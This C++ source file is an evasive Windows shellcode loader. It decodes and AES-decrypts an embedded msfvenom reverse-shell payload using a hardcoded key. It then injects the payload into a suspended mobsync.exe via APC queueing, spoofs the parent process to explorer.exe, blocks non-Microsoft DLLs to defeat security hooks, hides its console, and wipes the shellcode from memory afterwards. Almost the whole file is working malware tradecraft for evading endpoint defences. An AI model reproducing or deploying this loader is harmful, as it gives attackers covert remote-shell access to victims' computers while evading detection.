#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <vector>
#include "aes.hpp"
#include "base64.h"
#include "low.h"
#include "chaff.h"

// This is just directly stolen from ired.team
DWORD get_PPID() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process = { 0 };
    process.dwSize = sizeof(process);

    if (Process32First(snapshot, &process)) {
        do {
            if (!wcscmp(process.szExeFile, L"explorer.exe"))
                break;
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);
    return process.th32ProcessID;
}

// Process Hollowing
VOID hollow(std::vector<byte> payload, chaff c)
{
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    LPVOID mem;
    HANDLE hProcess, hThread;
    DWORD pid;
    DWORD bytesWritten;

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    SIZE_T size = 0;

    // Initialize custom startup objects for CreateProcess()
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;
    InitializeProcThreadAttributeList(NULL, 2, 0, &size);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
    c.fib();

    // Disallow non-microsoft signed DLL's from hooking/injecting into our CreateProcess():
    InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, &size);
    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);

    // Mask the PPID to that of explorer.exe
    HANDLE explorer_handle = OpenProcess(PROCESS_ALL_ACCESS, false, get_PPID());
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &explorer_handle, sizeof(HANDLE), NULL, NULL);

    LPCWSTR hollow_bin = L"C:\\Windows\\System32\\mobsync.exe";
    if (!CreateProcess(
        hollow_bin,			// LPCWSTR Command (Binary to Execute)
        NULL,				// Command line
        NULL,				// Process handle not inheritable
        NULL,				// Thread handle not inheritable
        FALSE,				// Set handle inheritance to FALSE
        EXTENDED_STARTUPINFO_PRESENT
        | CREATE_NO_WINDOW
        | CREATE_SUSPENDED,	// Creation Flags
        NULL,				// Use parent's environment block
        NULL,				// Use parent's starting directory 
        (LPSTARTUPINFOW)&si,// Pointer to STARTUPINFO structure
        &pi					// Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
    )) {
        DWORD errval = GetLastError();
        std::cout << "whoops " << errval << std::endl;
    }

    WaitForSingleObject(pi.hProcess, 1400);
    hProcess = pi.hProcess;
    hThread = pi.hThread;

    mem = nullptr;
    SIZE_T p_size = payload.size();
    NtAllocateVirtualMemory(hProcess, &mem, 0, (PSIZE_T)&p_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    NtWriteVirtualMemory(hProcess, mem, payload.data(), payload.size(), 0);
    NtQueueApcThread(hThread, (PKNORMAL_ROUTINE)mem, mem, NULL, NULL);
    NtResumeThread(hThread, NULL);

    // Overwrite shellcode with null bytes
    Sleep(9999);
    uint8_t overwrite[500];
    NtWriteVirtualMemory(hProcess, mem, overwrite, sizeof(overwrite), 0);

}


int main()
{
    chaff c = chaff();
    c.fib();
    c.prime();

    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Disallow non-MSFT signed DLL's from injecting
    PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY sp = {};
    sp.MicrosoftSignedOnly = 1;
    SetProcessMitigationPolicy(ProcessSignaturePolicy, &sp, sizeof(sp));

    std::vector<uint8_t> ciphertext, recovered;
    std::string shellcode, decoded;
    base64 b64 = base64();

    // Decode shellcode and load into uint8_t vector for decryption
    // msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -f raw >> 64b_443_localhost_revshell.bin
    shellcode = "cYylIwGpiexlI6YOl8xPDHoe1GzU0Tkxnyb8Z/MmxtZvK8yzeXWgp0mAwfsSK9eNaUx63whIZP3mzebi5M3s/OPXmivNnImmTw3iqAmL0I4gl+RzuJ6Wx58LikDVJnJLMgBMds9h/BnNi5Fy6SqQlZ3zDTT77HMOWMM/3TtvNPRfT6RGxyeqJkX0HNXnDljB9jbnkh6lrOFWzGF5CfB9JLsHXQ9f1ipyQ7wdzL7NNwER/TZATjokbkT/c9kEddOXNsBHLxSyPgdgaPtgRsJq2LeszOIhjHNdfKATYAZ+ntiPBW5AKFqILtjqSeNmH8LMhwpKuALXbVMGlvmP02Sol0r1W0l23qLEJwmjV7CwUj2rqp9SpIXLpM6FP0MdrFTUGLrr/YfQwPkCaE2MdUAn3wd5i3NqlKRCTJLq4XqFAy2lEmmg/GDJYggXAmpNMCBSermMQ5OSdRnxO50pxhxjnBY08ilZ0Vpf007Gy69auXRcJZ2TCDIneCJ/oamMubMLQBegSwOow8fJIDvZ5tJXSwrJrz1ETtphSRn2TpeOtYAP5wIJ+xNoXH0YEa0EJXcjgIGnpqcgpRNyErO/DDmjCkJQFCvlqKqC5A/49ZfbUUvEPM61Ew9Kp+xb8v1RYTWw5mFsrSMKnIaMxjREJl+O7B6VmtjmDRMthpjb2Q03lE6dKkCgWj2ilLKKpr6JDbZEqnRN4A1lgLw/MXHE1i/WFjryfgGkEEjoW6AUqK0D7TF6AyRsyjaHzVtsQqGKvx7unMRPFnG18aNkV8/wYZLcPQVmR5OVDDV4xgRTjl7Ao63rx8cQ84PyBauf+eUhCEWNNKIaJ8TqO2AbwxLOQbuj+9/vF3G/dcgxoyCccs7MIANkU1dH+MAuNY1yGQGgTQK5i4Zeawbr+9HOkAZtLDIMxVetEqiX93N0evU1Zvrkors9W1vnmK2ueNd9VBHovqEFC2LRGqqPLBGYEgY2E/8yQGgsm+UvwEv4FZ9Nz3N0+XS8DAak7ZCZy7WilAF58MKKN6gnaPqVZPGIRtH5F67fu7SYz5z/AgWUSgbecChbZnGHBE41ibdVs+JOzP7pRPzGXJETDQGAHcjP7hv3/Q8ySKalDWwaNe/wQ505xIheCOVWKhk8wf+V1LhVmBt2PTEBdad2bydRUe02HtIUSns6TDpLNmEzwXzMNMPobHWk8LvS1u++uhZ4EUI6eqGsBtY4DwhywiDsz8XxOtaemjE6bzPclD/Yrop5mPdO+UodsoQ=";

    decoded = b64.base64_decode(shellcode);
    ciphertext.clear();
    std::copy(decoded.begin(), decoded.end(), std::back_inserter(ciphertext));

    // AES Decryption Objects
    struct AES_ctx e_ctx;
    uint8_t key[32] = {0x45,0x82,0xad,0x5c,0x8f,0xd5,0x1d,0x9f,0x73,0x34,0xf4,0xba,0x35,0xe0,0x47,0x13,0x53,0xa5,0xe9,0xa0,0x86,0xb8,0x39,0xd5,0x32,0xa6,0xa8,0xa6,0xfb,0xca,0x6e,0x5d};
    uint8_t iv[16] = {0x24,0xb2,0xd5,0xc5,0xa4,0x82,0xef,0xe1,0xa1,0xc4,0x21,0xcd,0x11,0x53,0xd2,0x92};
    
    AES_init_ctx_iv(&e_ctx, key, iv);

    // DECRYPT
    struct AES_ctx d_ctx;
    AES_init_ctx_iv(&d_ctx, key, iv);
    AES_CBC_decrypt_buffer(&d_ctx, ciphertext.data(), ciphertext.size());
    recovered.clear();

    // Remove the padding from the decypted plaintext
    SIZE_T c_size = ciphertext.size();
    for (int i = 0; i < c_size; i++)
    {
        if (ciphertext[i] == 0x90 && i == (c_size - 1))
        {
            break;
        }
        else if (ciphertext[i] == 0x90 && ciphertext[i + 1] == 0x90)
        {
            break;
        }
        else
        {
            recovered.push_back(ciphertext[i]);
        }
    }

    hollow(recovered, c);
    return 0;
}

